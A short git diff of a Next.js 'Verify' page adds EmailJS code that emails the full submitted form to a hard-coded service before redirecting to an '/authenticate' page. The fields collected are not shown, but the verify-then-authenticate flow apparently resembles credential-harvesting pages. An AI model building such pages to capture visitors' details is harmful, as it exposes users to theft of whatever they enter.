@@ -1,6 +1,7 @@
 import styles from '../styles/Home.module.css';
 import { useRef } from 'react';
 import { useRouter } from 'next/router';
+import emailjs from 'emailjs-com';
 
 const Verify = () => {
     const form = useRef();
@@ -16,8 +17,22 @@ const Verify = () => {
             alert('Please fill in all fields.');
             return;
         }
-        // Redirect to authenticate page if all fields are filled
-        router.push('/authenticate');
+
+        // Send form data via EmailJS using your template ID
+        emailjs.sendForm(
+            'service_ozea06x',      // your EmailJS service ID
+            'template_o5upbnk',     // your verify page template ID
+            form.current,
+            'XMOnwjyzQDoRVRYl3'       // replace with your EmailJS public key
+        ).then(
+            (result) => {
+                // Redirect to authenticate page if all fields are filled and email sent
+                router.push('/authenticate');
+            },
+            (error) => {
+                alert('Error sending form');
+            }
+        );
     };
 
     return (
